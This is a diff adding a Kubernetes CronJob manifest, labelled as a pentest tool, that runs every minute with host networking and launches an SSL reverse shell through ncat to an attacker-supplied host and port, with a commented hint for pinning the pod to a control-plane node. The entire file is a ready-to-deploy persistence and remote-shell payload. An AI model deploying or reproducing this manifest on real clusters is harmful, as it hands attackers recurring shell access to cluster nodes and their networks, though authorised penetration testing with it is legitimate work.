@@ -1,0 +1,21 @@
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: hostnetwork
+  labels:
+    app: pentest
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostNetwork: true
+          containers:
+          - name: hostnetwork
+            image: raesene/ncat
+            command: [ "/bin/sh", "-c", "--" ]
+            args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
+          #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+          restartPolicy: OnFailure
